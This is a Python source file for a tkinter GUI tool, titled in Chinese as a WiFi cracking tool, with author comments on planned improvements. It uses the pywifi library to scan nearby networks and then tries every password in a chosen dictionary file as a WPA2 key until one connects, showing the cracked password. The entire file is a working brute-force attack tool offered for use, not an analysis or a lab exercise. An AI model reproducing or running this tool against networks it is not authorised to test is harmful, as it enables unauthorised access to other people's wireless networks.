#!/usr/bin/env python

from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox
import threading

# 当前版本存在的问题：
# 1、运行较大的字典时，由于无法快速找到密码，
# 只有一个主线程的该程序会将窗口阻塞，导致窗口未响应
# 2、窗口界面布局我不是很满意，我希望有搜索附近wifi、选择密码本、开始爆破这几个功能
# 而且 wifi 并不需要一个文本框来展示，只需要显示wifi和信号强度即可
# 感觉破解的过程才需要一个一个文本框展示，因此我需要重构该窗口类
# 3、需要增加用户手动调整扫描等待时长和连接等待时长的功能

class MY_GUI():
    def __init__(self, myWindow:Tk):
        self.myWindow = myWindow
        self.wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = self.wifi.interfaces()[0]  # 抓取第一个无线网卡

        # GUI元素
        self.get_wifi_value = StringVar(value='搜索后双击 wifi 以填充')
        self.get_value = StringVar()
        self.get_wifipwd_value = StringVar()

    def set_init_window(self):
        # ********* 窗口配置 ********
        self.myWindow.title("WIFI破解工具")
        w, h = self.myWindow.maxsize()
        self.myWindow.geometry(f'550x400+{(w - 550)//2}+{(h - 400)//2}')

        # *********** wifi展示列 *********
        self.wifi_labelframe = LabelFrame(self.myWindow, text="wifi列表")
        self.wifi_labelframe.grid(column=0, row=0, columnspan=4, sticky=(W, E, N, S), padx=10, pady=5)

        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=200, anchor="center")
        self.wifi_tree.column("c", width=200, anchor="center")
        self.wifi_tree.column("d", width=50, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="Signal")

        self.wifi_tree.grid(row=0, column=0, sticky=(W, E, N, S))
        self.vbar.grid(row=0, column=1, sticky=(N, S))
        self.wifi_labelframe.grid_columnconfigure(0, weight=1)
        self.wifi_labelframe.grid_rowconfigure(0, weight=1)

        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        
        # ************* 配置区域 ***************
        labelframe = LabelFrame(self.myWindow, text="配置")
        labelframe.grid(column=0, row=1, padx=10, pady=5, sticky=(W, E, N, S))

        Label(labelframe, text="WIFI帐号: ").grid(column=0, row=0, sticky=W)
        Entry(labelframe, textvariable=self.get_wifi_value, width=22).grid(column=1, row=0, sticky=W)
        Button(labelframe, text="搜索附近WiFi", command=lambda:self.work_in_back(self.scans_wifi_list)).grid(column=2, row=0, padx=10, pady=5, sticky=W)
        Button(labelframe, text="开始破解", command=lambda:self.work_in_back(self.readPassWord)).grid(column=3, row=0, sticky=W)

        Label(labelframe, text="文件路径：").grid(column=0, row=1, sticky=W)
        Entry(labelframe, width=22, textvariable=self.get_value).grid(column=1, row=1, sticky=W)
        Button(labelframe, text="添加密码文件", command=lambda:self.work_in_back(self.add_pwd_file)).grid(column=2, row=1, sticky=W, padx=10, pady=5)

        Label(labelframe, text="WIFI密码: ").grid(column=0, row=2, sticky=W)
        Entry(labelframe, width=22, textvariable=self.get_wifipwd_value).grid(column=1, row=2, sticky=W, padx=1, pady=5)
        Label(labelframe, text='此处用于展示破解成功的密码，不必填写', font=('',8), fg='red').grid(column=2, row=2)

    # 创建子线程后台运行，需要使用 lambda 延迟该函数执行
    def work_in_back(self, func, *args):
        threading.Thread(target=func, args=args).start()
        
    def scans_wifi_list(self):
        self.iface.disconnect()  # 测试链接断开所有链接
        time.sleep(1)  # 休眠1秒

        self.iface.scan()
        time.sleep(1)  # 适当调整等待时间
        scanres = self.iface.scan_results()
        self.show_scans_wifi_list(scanres)

    def show_scans_wifi_list(self, scans_res):
        # 清空原有结果
        for i in self.wifi_tree.get_children():
            self.wifi_tree.delete(i)
        # 插入新的结果
        for index, wifi_info in enumerate(scans_res):
            try:
                ssid = wifi_info.ssid.encode('raw_unicode_escape').decode('utf-8')
            except UnicodeDecodeError:
                ssid = wifi_info.ssid
            self.wifi_tree.insert("", 'end', values=(index + 1, ssid, wifi_info.bssid, wifi_info.signal))

    def add_pwd_file(self):
        filename = tkinter.filedialog.askopenfilename()
        if filename:
            self.get_value.set(filename)

    def onDBClick(self, event):
        for item in self.wifi_tree.selection():
            item_text = self.wifi_tree.item(item, "values")
            self.get_wifi_value.set(item_text[1])  # 填充选中的WiFi账号

    def readPassWord(self):
        filePath = self.get_value.get()
        wifi_ssid = self.get_wifi_value.get()
        if not wifi_ssid:
            tkinter.messagebox.showinfo('提示', '请选择对应wifi!')
            return
        elif not filePath:
            tkinter.messagebox.showinfo('提示', '请选择密码文件!')
            return

        with open(filePath, "r", errors="ignore") as pwd_file:
            for pwd in pwd_file:
                if self.connect(pwd.strip(), wifi_ssid):
                    self.get_wifipwd_value.set(pwd.strip())
                    tkinter.messagebox.showinfo('提示', '破解成功，密码是：' + pwd.strip())
                    return
            tkinter.messagebox.showinfo('提示', '破解失败，尝试所有密码均不匹配！')

    def connect(self, pwd_str, wifi_ssid):
        profile = pywifi.Profile()
        profile.ssid = wifi_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm = const.AKM_TYPE_WPA2PSK
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd_str
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)
        time.sleep(5)  # 等待5秒，以便连接稳定
        if self.iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            self.iface.disconnect()
            time.sleep(0.1)
            return False


def gui_start():
    init_window = Tk()
    ZH_WIFI_GUI = MY_GUI(init_window)
    ZH_WIFI_GUI.set_init_window()
    init_window.mainloop()


if __name__ == '__main__':
    gui_start()
